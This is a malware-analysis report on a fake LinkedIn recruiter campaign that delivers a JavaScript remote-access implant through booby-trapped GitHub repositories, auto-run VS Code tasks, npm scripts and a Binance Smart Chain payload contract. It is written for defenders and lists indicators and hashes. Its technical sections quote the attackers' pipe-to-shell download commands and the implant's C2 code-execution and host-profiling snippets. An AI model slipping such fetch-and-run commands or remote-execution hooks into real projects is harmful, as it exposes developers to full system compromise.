---
title: "Interview Trap: Blockchain-Staged JavaScript RAT Delivered via LinkedIn"
date: 2026-02-24
author: "ThreatProphet"
description: "Analysis of a sophisticated fake recruiter campaign delivering a JavaScript RAT via LinkedIn, with payload staging through a Binance Smart Chain smart contract."
tags:
  - dprk-linked
  - contagious-interview
  - etherhiding
  - javascript
  - rat
  - linkedin-lure
  - blockchain
  - binance-smart-chain
  - node-js
  - vscode
  - vscode-task-abuse
  - developer-targeting
categories:
  - malware-analysis
  - threat-intelligence
tlp: "CLEAR"
mitre_techniques:
  - T1566.003
  - T1684.001
  - T1585.001
  - T1585.002
  - T1059.003
  - T1059.004
  - T1059.007
  - T1071.001
  - T1571
  - T1027
  - T1082
  - T1016
  - T1204.002
report_id: "TP-2026-001"
showToc: true
---

> *"The snare is laid in secret; the prey walks toward it of his own will."*

## Executive Summary

A threat actor, operating a fake recruiter persona on LinkedIn, targeted developers by asking them to complete a “technical assessment” that required cloning and running a malicious GitHub repository named **Tech-Core**. The repository contained a multi-stage malware implant designed to execute through two paths: VS Code workspace task abuse and npm script execution.

The technically distinctive element of this campaign is its payload staging mechanism: malicious JavaScript is not stored in the repository itself but is retrieved at runtime from a smart contract deployed on the **Binance Smart Chain (BSC)**. The contract's `getMemo()` function returns obfuscated JavaScript which is executed dynamically via Node.js's `Function` constructor, granting the implant full system access.

Once active, the implant beacons to a hardcoded C2 server every 5 seconds, transmitting host profiling data. Preserved variants use the same C2 host with two observed HTTP paths: `/api/err/error` in the deobfuscated BSC-staged payload and `/api/errorMessage` in the Vercel Stage 1c implant. The C2 can respond with an arbitrary second-stage payload, providing full remote code execution on the victim machine.

A cluster of related repositories was identified sharing the same execution mechanism, overlapping infrastructure, and common Git author identities, indicating an organized campaign targeting developers through fake job opportunities. Investigation identified a further repository, **Softstack-Platform-MVP2** (GitHub org: Softstack-Hub5), as a direct rebrand of Tech-Core using identical malware files and the same BSC payload contract. The Softstack-Hub5 organization impersonates the legitimate German company SOFTSTACK GmbH. The existence of a related `Softstack-Hub4` account with no public repositories supports a hypothesis of sequential persona preparation, although this should be treated as an inference unless account creation metadata is available. TTPs are consistent with DPRK-linked **Contagious Interview** activity documented by multiple vendors, but attribution is assessed at **low-to-medium confidence** and based on tradecraft overlap rather than independently confirmed operator identity.

---

## Evidence Basis and Scope

This report is based on preserved repository artifacts, Git commit metadata, captured Vercel-hosted stage payloads, decoded smart-contract payloads, screenshots, SHA-256 manifests, and chain-of-custody records. Where infrastructure is no longer reachable, statements in this report rely on preserved artifacts rather than current live availability.

The underlying evidence archive is not distributed with this report. Artifacts are therefore referenced by descriptive labels, hashes, commit IDs, and observable behavior rather than by local investigator file paths. Other investigators can use the published hashes and indicators to compare against independently preserved material.

The report separates four evidentiary layers:

1. **Directly observed malware behavior**: code paths, scripts, dynamic execution primitives, C2 beacons, and payload contents preserved from the repositories and retrieved stages.
2. **Infrastructure and repository overlap**: shared domains, contracts, file hashes, commit metadata, and GitHub organization naming patterns.
3. **Campaign-continuity assessment**: inferred relationships between repositories and personas based on technical overlap and temporal sequencing.
4. **Attribution assessment**: low-to-medium confidence alignment with DPRK-linked Contagious Interview tradecraft based on external reporting and observed TTP similarity.

Repository HEAD values from the preserved mirrors resolve as follows:

| Repository / preserved state | HEAD commit | Author | Commit date | Subject |
|---|---|---|---|---|
| NeonVerse | `7fd868d072e6ef94b4626b7673d6273468995191` | `alindaniel360 <alindaniel0802@gmail.com>` | 2025-11-18T04:20:36-03:00 | `Update env & auth` |
| Softstack-Platform-MVP2 | `42f354c47b40c5651ea8df497785154779742b60` | `CodeBlock110 <stevejame329+1@gmail.com>` | 2026-02-23T05:17:44-04:00 | `Update tasks.json` |
| Tech-Core, later preserved state | `8880a005aa00d59d80a0bdf4ff25c5007ea82fc5` | `lucky-tech-hub <brajan.intro@gmail.com>` | 2026-02-19T23:41:57-05:00 | `Update tasks.json` |
| Tech-Core, earlier preserved state | `2423cac8f5fbc90313e6c324d8d5bd0feb507d7d` | `LuckyKat1001 <brajan.intro@gmail.com>` | 2026-02-10T09:54:57-05:00 | `update readme version` |

A broader author-to-commit extraction across actor-relevant preserved history produced 161 commits. The most frequently observed author identities were:

| Author identity | Commit count | Assessment |
|---|---:|---|
| `CodeBlock110 <stevejame329+1@gmail.com>` | 59 | Repeated actor-relevant Git identity; Softstack-Platform-MVP2 HEAD author |
| `LuckyKat1001 <brajan.intro@gmail.com>` | 58 | Primary Tech-Core cluster Git identity |
| `alindaniel360 <alindaniel0802@gmail.com>` | 35 | Repeated actor-relevant Git identity; NeonVerse HEAD author |
| `Sergiy Savatyeyev <ssavateev@gmail.com>` | 7 | Fork-related identity; do not treat as operator-controlled without additional evidence |
| `lucky-tech-hub <brajan.intro@gmail.com>` | 1 | Same email as LuckyKat1001, different author name; later Tech-Core preserved-state HEAD author |
| `Ivan <167746537+DeAngDai354@users.noreply.github.com>` | 1 | GitHub noreply identity; platform-derived account metadata |

Only Git author identities and repository-linked account metadata should be promoted into the actor/persona section. Provider abuse contacts, placeholders, and unrelated contact strings should remain excluded from IOCs.

## Timeline

| Date | Event | Evidence basis |
|---|---|---|
| 2025-11-18 | Preserved NeonVerse state has HEAD commit authored by `alindaniel360 <alindaniel0802@gmail.com>` | Commit `7fd868d072e6ef94b4626b7673d6273468995191`, subject `Update env & auth` |
| 2026-02-10 | Earlier preserved Tech-Core state has HEAD commit authored by `LuckyKat1001 <brajan.intro@gmail.com>` | Commit `2423cac8f5fbc90313e6c324d8d5bd0feb507d7d`, subject `update readme version` |
| 2026-02-19 | Later preserved Tech-Core state has HEAD commit authored by `lucky-tech-hub <brajan.intro@gmail.com>` | Commit `8880a005aa00d59d80a0bdf4ff25c5007ea82fc5`, subject `Update tasks.json` |
| 2026-02-21 | BSC `getMemo()` payload retrieved and decoded | Raw and decoded payload hashes listed in the IOC section |
| 2026-02-23 | Preserved Softstack-Platform-MVP2 state has HEAD commit authored by `CodeBlock110 <stevejame329+1@gmail.com>` | Commit `42f354c47b40c5651ea8df497785154779742b60`, subject `Update tasks.json` |
| 2026-02-24 | TP-2026-001 report published | Report publication date |
| 2026-02-26 | Softstack-Platform-MVP2 evidence preserved | Repository and payload hashes listed in the IOC section |

Remaining timeline enrichments should focus on contract creation/update transactions and Vercel endpoint capture timestamps where available.

## Attack Overview

### Initial Contact

A LinkedIn recruiter persona was used to initiate contact and present a developer hiring pretext. The workflow directed the target to complete a “technical assessment” that consisted of cloning and executing a GitHub repository. This delivery pattern, fake technical interviews distributed via LinkedIn, is a defining characteristic of activity reported under the Contagious Interview and Operation Dream Job monikers, associated with Lazarus Group developer-targeting campaigns since at least 2020.

### Repository Cluster

The primary lure repository was **Tech-Core**. Investigation revealed a broader cluster of interconnected repositories sharing the same malicious execution mechanism:

| Repository | GitHub Account | Notes |
|---|---|---|
| Tech-Core | LuckyKat1001 | Primary lure repository |
| NeonVerse | LuckyKat1001 | Earlier variant, used Polygon contracts |
| PixelVerse | LuckyKat1001 | Structural match |
| SpreadChain | LuckyKat1001 | Shared Git author identity |
| Modex | LuckyKat1001 | Shared execution mechanism |
| Softstack-Platform-MVP2 | Softstack-Hub5 | Rebrand, identical malware and BSC contract, impersonates real company SOFTSTACK GmbH |

### Kill Chain

1. Victim opens the Tech-Core repository in VS Code. In a trusted workspace, or where automatic tasks have been allowed, tasks configured with `runOn: folderOpen` execute when the folder is opened.
2. VS Code tasks silently execute an OS-specific pipe-to-shell command against a Vercel-hosted endpoint, fetching and executing a first-stage shell script. Output is suppressed via `reveal: silent`, `close: true`, `echo: false`.
3. Separately, running any common npm command (`npm start`, `npm test`, `npm run build`, `npm run prepare`) executes `node server/server.js`, triggering `configureCollection()` on startup.
4. `configureCollection()` calls the BSC smart contract's `getMemo()` function over JSON-RPC, retrieving concatenated segments of obfuscated JavaScript.
5. The retrieved payload is executed via `new Function('require', payload)(require)`, injecting Node's `require` to enable full filesystem and network access.
6. The implant profiles the host (hostname, MAC addresses, OS) and beacons to C2 every 5 seconds.
7. If C2 responds with `status === 'error'`, the response body is executed as a further JavaScript stage - arbitrary remote code execution.

---

## Technical Analysis

### Stage 1: VS Code Task Auto-Execution

The repository includes a `.vscode/tasks.json` configuring two malicious tasks. The key property `runOptions.runOn: "folderOpen"` causes task execution when the folder is opened, provided the workspace is trusted or automatic tasks have already been allowed. VS Code normally prompts the first time a folder contains a `folderOpen` task, and Workspace Trust can restrict automatic task execution. This does not remove the risk; it means the attack depends on the victim trusting the workspace or permitting automatic task execution.

The task implements a cross-platform pipe-to-shell RCE primitive:

```bash
# macOS
curl <vercel_url>/api/settings/mac | bash

# Linux
wget -qO- <vercel_url>/api/settings/linux | sh

# Windows
curl <vercel_url>/api/settings/win | cmd
```

Three Vercel domains were observed across different commits, indicating active infrastructure rotation to evade takedowns:

| Domain | Status |
|---|---|
| vscodesettingtask.vercel[.]app | Inactive |
| vscodesetting-task.vercel[.]app | Inactive |
| vscode-settings-tasks-json.vercel[.]app | Inactive at time of analysis |
| vscode-ipchecking.vercel[.]app | **Active at time of analysis** - updated infrastructure |

#### Preserved VS Code task evidence

The preserved working copies show the same task structure but different Vercel delivery domains, supporting infrastructure rotation across the campaign:

| Repository | Task label | OS path | Preserved command |
|---|---|---|---|
| Tech-Core | `install-root-modules` | all | `npm install --silent --no-progress` with `runOn: folderOpen` |
| Tech-Core | `env` | macOS | `curl -L 'https://vscode-settings-tasks-json[.]vercel[.]app/api/settings/mac' \| bash` |
| Tech-Core | `env` | Linux | `wget -qO- 'https://vscode-settings-tasks-json[.]vercel[.]app/api/settings/linux' \| sh` |
| Tech-Core | `env` | Windows | `curl --ssl-no-revoke -L https://vscode-settings-tasks-json[.]vercel[.]app/api/settings/windows \| cmd` |
| Softstack-Platform-MVP2 | `install-root-modules` | all | `npm install --silent --no-progress` with `runOn: folderOpen` |
| Softstack-Platform-MVP2 | `env` | macOS | `curl -L 'https://vscode-ipchecking[.]vercel[.]app/api/settings/mac' \| bash` |
| Softstack-Platform-MVP2 | `env` | Linux | `wget -qO- 'https://vscode-ipchecking[.]vercel[.]app/api/settings/linux' \| sh` |
| Softstack-Platform-MVP2 | `env` | Windows | `curl --ssl-no-revoke -L https://vscode-ipchecking[.]vercel[.]app/api/settings/windows \| cmd` |

Both repositories suppress task visibility using presentation settings such as `reveal: silent`, `echo: false`, `focus: false`, `panel: new`, `showReuseMessage: false`, and `clear: true`; the `env` task additionally uses `close: true`.

### NPM Script Execution Path

The VS Code task path is not the only execution route. The preserved `package.json` files for both **Tech-Core** and **Softstack-Platform-MVP2** route common developer commands through `node server/server.js` before invoking the expected React scripts. This means normal actions such as `npm start`, `npm run build`, `npm test`, `npm run eject`, or lifecycle execution of `prepare` can trigger the server-side collection path.

| Repository | Script | Preserved command |
|---|---|---|
| Tech-Core | `start` | `node server/server.js \| react-scripts --openssl-legacy-provider start` |
| Tech-Core | `build` | `node server/server.js \| react-scripts --openssl-legacy-provider build` |
| Tech-Core | `test` | `node server/server.js \| react-scripts --openssl-legacy-provider test` |
| Tech-Core | `eject` | `node server/server.js \| react-scripts --openssl-legacy-provider eject` |
| Tech-Core | `prepare` | `node server/server.js` |
| Softstack-Platform-MVP2 | `start` | `node server/server.js \| react-scripts --openssl-legacy-provider start` |
| Softstack-Platform-MVP2 | `build` | `node server/server.js \| react-scripts --openssl-legacy-provider build` |
| Softstack-Platform-MVP2 | `test` | `node server/server.js \| react-scripts --openssl-legacy-provider test` |
| Softstack-Platform-MVP2 | `eject` | `node server/server.js \| react-scripts --openssl-legacy-provider eject` |
| Softstack-Platform-MVP2 | `prepare` | `node server/server.js` |

The use of shell pipes here is operationally useful for the actor: the command still appears to run the expected React workflow while first starting the malicious Node.js server entry point.

### Stage 1b: Updated Delivery Infrastructure (Active at Time of Analysis)

The preserved **Softstack-Platform-MVP2** working copy points to the newer Vercel domain `vscode-ipchecking.vercel[.]app`, while the preserved **Tech-Core** working copy points to `vscode-settings-tasks-json.vercel[.]app`. Unlike the older inactive domains, `vscode-ipchecking.vercel[.]app` was active at the time of retrieval, allowing the full Stage 1 delivery chain to be captured.

This later delivery path evolved from a single pipe-to-shell command into a two-stage shell execution chain.

**Stage 1a - Loader (`/api/settings/linux`)**

A minimal bash script that prints `Authenticated` (social engineering misdirection), creates `$HOME/.vscode/`, downloads the bootstrap script, and executes it silently via `nohup`. The `echo "Authenticated"` output is visible to the victim in the VS Code terminal - a deliberate attempt to make the task appear legitimate.

**Stage 1b - Bootstrap (`/api/settings/bootstraplinux`)**

A significantly more sophisticated script that silently: checks for an existing Node.js installation and if absent downloads a portable Node.js binary from `nodejs.org` into `$HOME/.vscode/`; records the name of the currently open VS Code folder to `$HOME/.vscode/<foldername>.txt` (victim workspace fingerprinting); downloads `env-setup.js` (the C2 implant) and `package.json` from the same Vercel endpoint; runs `npm install` to pull dependencies (`axios`, `request`); then executes `env-setup.js` via Node.js.

This bootstrap ensures execution succeeds even on systems without Node.js pre-installed, significantly broadening the potential victim pool beyond developers with an existing Node environment.

**Stage 1c - C2 Implant (`/api/settings/env`)**

The retrieved `env-setup.js` should be treated as a **parallel delivery-path implant** associated with the same activity cluster rather than as textually identical to the on-chain payload. Feature extraction and deobfuscation show two related but distinct C2 paths on the same host:

| Artifact | Extracted / reconstructed C2 material | Campaign markers | Execution sinks | Notes |
|---|---|---|---|---|
| BSC decoded artifact | No direct URL extracted from the obfuscated decoded file | `1228`, `exceptionId`, `instanceId` | `new Function`, `require(` | Endpoint is assembled from fragments and should be cited through the deobfuscated copy |
| Deobfuscated BSC payload copy | `hxxp://163.245.194[.]216:3000/api/err/error` | `1228`, `exceptionId`, `instanceId` | `new Function('require', code)(require)` | Confirms the `/api/err/error` path for the BSC-staged payload |
| Vercel Stage 1c implant | `hxxp://163.245.194[.]216:3000/api/errorMessage` | `env991228`, `exceptionId`, `instanceId` | `new Function`, `require(` | Confirms the `/api/errorMessage` path for the Vercel stage |

The analytic relationship should therefore rest on feature-level overlap, campaign markers, shared C2 host, shared dynamic execution primitive, and repository/infrastructure context, not on raw-file identity. The embedded campaign identifier in the Vercel variant is `env991228`, retaining the `1228` suffix observed in the BSC-staged payload.

**Stage 1d - Package manifest (`/api/settings/package`)**

A minimal `package.json` pulling `axios ^1.10.0` and `request ^2.88.2`, with a start script pointing to `env.npl` - consistent with InvisibleFerret-style naming conventions documented in prior Contagious Interview reporting.

This two-stage delivery represents an operational improvement over the single pipe-to-shell approach: more resilient, handles missing dependencies, and reduces the chance of noisy failures that might alert the victim.

### Stage 2: On-Chain Payload Staging

The most technically distinctive element of this campaign is the use of a blockchain smart contract as an off-repository payload store. The logic in `server/controllers/collection.js`:

1. Connects to BSC JSON-RPC via `ethers.providers.JsonRpcProvider(RPC_URL)`
2. Instantiates the smart contract with ABI: `getMemo() → string`
3. Calls `contract.getMemo()` - returns segments of obfuscated JavaScript
4. Concatenates returned strings to reconstruct the full payload
5. Executes: `new Function('require', payload)(require)`

This mechanism is significant from a detection standpoint: the malicious payload is not stored directly in the repository and is not present in a conventional scannable source file before retrieval. It lives on-chain and is reconstructed at runtime, placing it outside normal repository scanning and static file-based inspection until the retrieval and execution path is analyzed.

The BSC contract used by Tech-Core:
```
0xE251b37Bac8D85984d96da55dc977A609716EBDc
```

An earlier NeonVerse variant used two Polygon contracts:
```
0xad031E8d8877481337cD53E141C16A2201BB6F4d
0xa80db78ff597c3D34cCAF3bdaC39f3E193595561
```

### Relation to EtherHiding

The BSC staging mechanism observed in Tech-Core is consistent with the broader **EtherHiding** pattern later documented by Google Threat Intelligence: malicious JavaScript is stored in public blockchain smart contracts and retrieved through read-only calls before execution. Google reported that DPRK-linked UNC5342 incorporated EtherHiding into Contagious Interview activity, using JavaScript-based downloaders to retrieve payloads from BNB Smart Chain and Ethereum smart contracts.

The Tech-Core implementation differs in some implementation details from the examples described in public reporting. The preserved payload uses a custom `getMemo()` function and a Node.js execution path rather than a browser-only chain. The tradecraft overlap is nevertheless analytically important: public blockchains are used as resilient off-repository payload stores, complicating conventional takedown and repository-centric detection.

This relationship should be treated as **technique-level correlation**, not as independent proof that the same operator controlled the Tech-Core infrastructure.

### Stage 3: Payload Analysis (Deobfuscated)

The on-chain payload was retrieved from BSC contract `0xE251b37B` on 2026-02-21 and deobfuscated. The payload uses a string-shuffling obfuscation technique characteristic of `javascript-obfuscator` tooling - a large string array is populated with encoded fragments, and a numeric-key decode function reconstructs identifiers at runtime. This technique is consistent with previously documented Lazarus Group / Contagious Interview implants.

**Dependency Setup**
```javascript
const axios = require('axios');
const os    = require('os');
let instanceId = 0;
```

Only `axios` and `os` are required. `os` is built into Node.js, while `axios` is a common dependency in JavaScript projects and is also installed by the captured bootstrap chain. This lowers the chance that dependency review alone would expose the implant.

**Host Profiling**
```javascript
hostname : os.hostname()
macs     : Object.values(os.networkInterfaces())
             .flat().filter(Boolean)
             .map(i => i.mac)
             .filter(m => m && m !== '00:00:00:00:00:00')
os       : os.type() + os.release() + '(' + os.platform() + ')'
```

MAC address filtering explicitly removes the loopback address, ensuring only real physical interfaces are reported - a deliberate fingerprinting choice to uniquely identify the victim across sessions.

**C2 Beacon**

Static feature extraction from the canonical decoded on-chain artifact recovered the markers `1228`, `exceptionId`, and `instanceId`, plus execution sinks such as `new Function` and `require(`. The URL is not directly visible as a contiguous string in that obfuscated artifact. The deobfuscated BSC payload copy reconstructs the following C2 endpoint:

```javascript
hxxp://163.245.194[.]216:3000/api/err/error
```

The Vercel Stage 1c implant directly contains a closely related C2 URL on the same host:

```javascript
hxxp://163.245.194[.]216:3000/api/errorMessage
```

Both variants collect host profiling data and use `exceptionId` plus `instanceId` parameters. The BSC-staged payload uses `exceptionId: '1228'`; the Vercel stage uses `exceptionId: 'env991228'`.

**Server-Driven Code Execution**
```javascript
if (response.data.status === 'error') {
  new Function('require', response.data.message)(require)
}
```

If C2 responds with `status: 'error'`, the message field is compiled and executed as a new JavaScript function with full `require` access. This is a fully general arbitrary code execution primitive. The use of `'error'` as the execution trigger is deliberate misdirection - error-handling code paths receive less scrutiny during code review.

The implant beacons immediately on load, then every 5 seconds indefinitely. An anti-debug wrapper is included to prevent debugger attachment and function serialization inspection.

### Payload Relationship: On-Chain vs Vercel Stage

A verification pass confirmed the canonical SHA-256 values for the preserved payload artifacts:

| Artifact | SHA-256 |
|---|---|
| BSC `getMemo()` raw response | `30d3b0536692d1c9455921ff97e4adfef1f463a26f3043c302f950c010911f66` |
| BSC `getMemo()` decoded payload | `5cde597193dd137e09b1d53e6869ee8d5930bd36d5992705b036acc435b2a38e` |
| Deobfuscated BSC payload copy | `e1c5717ac4ae0c398af49a5482dee419d4f23806e8137b65c77190624668c8da` |
| Vercel Stage 1c C2 implant | `e1790a08ebf0402d49e826b6f773b3b6e55f3cb5a755bc2067dda2a0c2737503` |
| Stage 1a loader | `89b2ecf801d5c93c71a8a7f01e3a3ee37f45590e14e035741bd1a8a5f4c33ded` |
| Stage 1b bootstrap | `85dcf1705064dcd13e6d1b95b5c1e9f62f269887410385a474a462426d9e9384` |
| Stage 1d package manifest | `6effad9fdee81589b37c60bbbae20483200bf53bee3e3c107b1aa47d2ac4ccb3` |

Feature extraction against the canonical files produced a more precise relationship than the earlier automated similarity result:

| Feature | BSC decoded artifact | Deobfuscated BSC copy | Vercel Stage 1c implant | Assessment |
|---|---|---|---|---|
| IPv4 / URL | No contiguous URL statically extracted | `163.245.194[.]216`, `/api/err/error` | `163.245.194[.]216`, `/api/errorMessage` | Same C2 host; different HTTP paths by delivery path |
| Campaign markers | `1228`, `exceptionId`, `instanceId` | `1228`, `exceptionId`, `instanceId` | `env991228`, `exceptionId`, `instanceId` | Strong marker overlap around `1228` |
| Execution sinks | `new Function`, `require(` | `new Function('require', code)(require)` | `new Function`, `require(` | Shared dynamic execution pattern |
| Node module use | `os` visible; `axios` reconstructed after deobfuscation | `axios`, `os` | `axios`, `os` | Shared host-profiling and HTTP client behavior |
| Beacon interval | `0x1388` | 5 seconds | `0x1388` | Shared 5-second polling interval |

The safe assessment is therefore:

- the on-chain payload and Vercel Stage 1c implant are both part of the preserved delivery evidence set;
- both contain dynamic JavaScript execution sinks;
- both contain campaign-marker material linked to `1228`;
- both use the same C2 host, `163.245.194[.]216:3000`, but with different HTTP paths;
- the BSC-staged payload uses `/api/err/error` with `exceptionId=1228`;
- the Vercel stage uses `/api/errorMessage` with `exceptionId=env991228`;
- raw-file identity is not established;
- semantic equivalence should not be claimed unless the deobfuscated BSC copy is compared against the Vercel stage at an AST or behavior level.

For publication, avoid saying that the Vercel payload is “identical” or “functionally identical” to the on-chain payload. A better formulation is: **the Vercel stage and BSC-staged payload are related delivery-path artifacts with overlapping campaign markers, shared C2 host, and shared execution primitives.**

### Credential / Auth-Endpoint Staging

Earlier commits in Tech-Core include a `.env` variable `AUTH_API` containing a Base64-encoded URL:

```
AUTH_API=aHR0cHM6Ly9hdXRoLXB1Y2UtdGF1LnZlcmNlbC5hcHAvYXBp
Decoded: https://auth-puce-tau[.]vercel[.]app/api  [inactive at time of analysis]
```

Paired code in `server/routes/api/auth.js` decoded this value at runtime via `atob(process.env.AUTH_API)`. This indicates an additional hidden remote endpoint embedded in configuration. Its precise purpose could not be confirmed from the inactive endpoint alone; however, its placement in the authentication route makes it relevant as a suspected earlier-stage auth or credential-related delivery path. The report should avoid describing this as confirmed credential theft unless response data or code behavior proves collection or exfiltration.

### Confirmed Canonical Repository Owner

The fork at `github.com/Sergiy-Sa/Tech-Core` was explicitly forked from `LuckyKat1001/Tech-Core`, confirming that `LuckyKat1001` was the canonical GitHub owner of the primary malicious repository. This corroborates the Git author metadata (`LuckyKat1001 / brajan.intro@gmail.com`) observed in the commit history. It should not be interpreted as a real-world identity attribution without independent identity evidence.

---

## MITRE ATT&CK Mapping

| Technique ID | Name | Tactic | Notes |
|---|---|---|---|
| T1566.003 | Spearphishing via Service | Initial Access | LinkedIn recruitment lure and fake technical assessment |
| T1684.001 | Impersonation | Resource Development / Reconnaissance | Fake recruiter persona and company impersonation |
| T1585.001 | Establish Accounts: Social Media Accounts | Resource Development | LinkedIn persona used to initiate contact |
| T1585.002 | Establish Accounts: Email Accounts | Resource Development | Git author and invite email identities associated with repository activity |
| T1585.003 | Establish Accounts: Cloud Accounts | Resource Development | GitHub organizations/accounts used to host lure repositories; use as approximate mapping where ATT&CK does not provide a repository-specific sub-technique |
| T1593.003 | Search Open Websites/Domains: Code Repositories | Reconnaissance | Developer targeting and repository-based lure delivery; include only where supported by preserved interaction evidence |
| T1204.002 | User Execution: Malicious File | Execution | Victim opens/trusts repository or runs project commands |
| T1059.003 | Windows Command Shell | Execution | Windows task path pipes downloaded content to `cmd` |
| T1059.004 | Unix Shell | Execution | Linux/macOS task paths pipe downloaded content to `sh`/`bash` |
| T1059.007 | JavaScript | Execution | Node.js execution via `Function` constructor |
| T1059.006 | Python | Execution | Include only if later payloads or related evidence confirm Python/InvisibleFerret execution in this case |
| T1071.001 | Application Layer Protocol: Web Protocols | Command and Control | HTTP beacon to C2 endpoint |
| T1571 | Non-Standard Port | Command and Control | C2 over TCP/3000 |
| T1027 | Obfuscated Files or Information | Defense Evasion | String-array JavaScript obfuscation and runtime URL reconstruction |
| T1027.010 | Obfuscated Files or Information: Command Obfuscation | Defense Evasion | Obfuscated command and string reconstruction; use if retained in ATT&CK metadata |
| T1082 | System Information Discovery | Discovery | Hostname, OS type/release/platform collection |
| T1016 | System Network Configuration Discovery | Discovery | Network interface and MAC address enumeration |
| T1102.001 | Web Service: Dead Drop Resolver | Command and Control / Defense Evasion | Approximate mapping for blockchain-hosted payload retrieval. ATT&CK does not currently provide a clean technique for smart-contract payload storage. |

The earlier use of `T1033 System Owner/User Discovery` was removed because the preserved payload primarily collects system and network-interface data, not explicit user/account identity data.
---

## Infrastructure Analysis

### Network Infrastructure

| Indicator | Type | Notes |
|---|---|---|
| 163.245.194[.]216 | IPv4 | C2 server, TCP/3000 |
| 163.245.194[.]216:3000/api/err/error | URL | Deobfuscated BSC-staged payload C2 endpoint |
| 163.245.194[.]216:3000/api/errorMessage | URL | Vercel Stage 1c implant C2 endpoint |
| vscodesettingtask.vercel[.]app | Domain | Stage 1 delivery, inactive |
| vscodesetting-task.vercel[.]app | Domain | Stage 1 delivery, rotated, inactive |
| vscode-settings-tasks-json.vercel[.]app | Domain | Stage 1 delivery, inactive at analysis |
| auth-puce-tau.vercel[.]app | Domain | Credential staging, inactive |
| vscode-ipchecking.vercel[.]app | Domain | Updated Stage 1 delivery, active at time of analysis |

**C2 IP Attribution:**

| Field | Value |
|---|---|
| Hosting Provider | Interserver, Inc |
| Network Name | INTER-83 |
| Entity | NOC1390-ARIN |

### Blockchain Infrastructure

| Address | Chain | Role |
|---|---|---|
| 0xE251b37Bac8D85984d96da55dc977A609716EBDc | BSC | Payload staging contract (Tech-Core) |
| 0xad031E8d8877481337cD53E141C16A2201BB6F4d | Polygon | Payload staging contract (NeonVerse, earlier) |
| 0xa80db78ff597c3D34cCAF3bdaC39f3E193595561 | Polygon | Payload staging contract (NeonVerse, earlier) |

---

## Indicators of Compromise

> All indicators assessed **High confidence** unless noted.

### Network Indicators

| Indicator | Type | Confidence |
|---|---|---|
| 163.245.194[.]216 | IPv4 | High |
| 163.245.194[.]216:3000 | IP:Port | High |
| hxxp://163.245.194[.]216:3000/api/errorMessage | URL | High |
| /api/err/error?exceptionId=1228 | URL pattern | High for deobfuscated BSC-staged payload |
| /api/errorMessage?exceptionId=env991228 | URL pattern | High for Vercel Stage 1c implant |
| vscodesettingtask.vercel[.]app | Domain | High |
| vscodesetting-task.vercel[.]app | Domain | High |
| vscode-settings-tasks-json.vercel[.]app | Domain | High |
| auth-puce-tau.vercel[.]app | Domain | Medium |
| vscode-ipchecking.vercel[.]app | Domain | High |
| vscode-ipchecking.vercel[.]app/api/settings/linux | URL | High |
| vscode-ipchecking.vercel[.]app/api/settings/bootstraplinux | URL | High |
| vscode-ipchecking.vercel[.]app/api/settings/env | URL | High |
| vscode-ipchecking.vercel[.]app/api/settings/package | URL | High |

### Blockchain Indicators

| Address | Chain | Confidence |
|---|---|---|
| 0xE251b37Bac8D85984d96da55dc977A609716EBDc | BSC | High |
| 0xad031E8d8877481337cD53E141C16A2201BB6F4d | Polygon | High |
| 0xa80db78ff597c3D34cCAF3bdaC39f3E193595561 | Polygon | High |

### Repository & Code Indicators

| Indicator | Type | Notes |
|---|---|---|
| github.com/LuckyKat1001/Tech-Core | Repository | Primary malicious repository |
| github.com/Sergiy-Sa/Tech-Core | Repository | Confirmed fork of above |
| github.com/Softstack-Hub5/Softstack-Platform-MVP2 | Repository | Rebrand of Tech-Core, identical malware |
| LuckyKat1001 | GitHub account | Operator - Tech-Core cluster |
| brajan.intro@gmail.com | Email | Git author identity - Tech-Core cluster |
| Softstack-Hub5 | GitHub organization | Operator - Softstack rebrand, impersonates SOFTSTACK GmbH |
| Softstack-Hub4 | GitHub organization | Pre-staged account, no public repositories |
| CodeBlock110 | GitHub account | Committer - Softstack-Platform-MVP2 |
| stevejame329+1@gmail.com | Email | Git author identity - Softstack cluster |
| alindaniel360 | Git author identity | Repeated actor-relevant author identity; NeonVerse HEAD author |
| alindaniel0802@gmail.com | Email | Git author identity associated with NeonVerse and actor-relevant commit history |
| `runOn: folderOpen` in `.vscode/tasks.json` | Code pattern | Auto-execution trigger |
| `new Function('require', payload)(require)` | Code pattern | Dynamic execution primitive |
| `exceptionId=1228` | Campaign ID | BSC-staged payload beacon parameter |
| `exceptionId=env991228` | Campaign ID | Vercel Stage 1c implant beacon parameter |

### Payload File Hashes

| Hash (SHA256) | Description |
|---|---|
| `30d3b0536692d1c9455921ff97e4adfef1f463a26f3043c302f950c010911f66` | getMemo raw hex payload, retrieved from BSC contract `0xE251b37Bac8D85984d96da55dc977A609716EBDc` on 2026-02-21 |
| `5cde597193dd137e09b1d53e6869ee8d5930bd36d5992705b036acc435b2a38e` | getMemo decoded payload, retrieved from BSC contract `0xE251b37Bac8D85984d96da55dc977A609716EBDc` on 2026-02-21 |
| `9f8c712f1364a87e1b4677395e2a2c8849c63526611a4665d197348c50f47818` | `collection.js` - blockchain staging component, Tech-Core HEAD |
| `ceff282f32aae9ce3dea6a9b00212e6de90669646180cb5e5bb6bf5353527bbd` | `tasks.json` - VS Code auto-execution config, Tech-Core HEAD |
| `95bc7ce3500278ff3e092c13e25675ea297301c54917a92b38ba4b10d471269f` | `server.js` - main implant entry point, Tech-Core HEAD |
| `89b2ecf801d5c93c71a8a7f01e3a3ee37f45590e14e035741bd1a8a5f4c33ded` | Stage 1a loader script (`/api/settings/linux`), retrieved from `vscode-ipchecking.vercel[.]app` |
| `85dcf1705064dcd13e6d1b95b5c1e9f62f269887410385a474a462426d9e9384` | Stage 1b bootstrap script (`/api/settings/bootstraplinux`), retrieved from `vscode-ipchecking.vercel[.]app` |
| `e1790a08ebf0402d49e826b6f773b3b6e55f3cb5a755bc2067dda2a0c2737503` | Stage 1c C2 implant `env-setup.js` (`/api/settings/env`), retrieved from `vscode-ipchecking.vercel[.]app` |
| `6effad9fdee81589b37c60bbbae20483200bf53bee3e3c107b1aa47d2ac4ccb3` | Stage 1d `package.json` (`/api/settings/package`), retrieved from `vscode-ipchecking.vercel[.]app` |
| `e1c5717ac4ae0c398af49a5482dee419d4f23806e8137b65c77190624668c8da` | Deobfuscated BSC payload copy |
| `a7cd162c691ad71a4c0c5955765d8f7a60d8b7b9a92b277b1ae74b280644cdf8` | `tasks.json` - VS Code auto-execution config, Softstack-Platform-MVP2 |
| `2f65e39dcbcb028da4bf4da43f3a1db7e5f9fff2dfd57ad1a5abd85d7950f365` | `package.json`, Softstack-Platform-MVP2 |
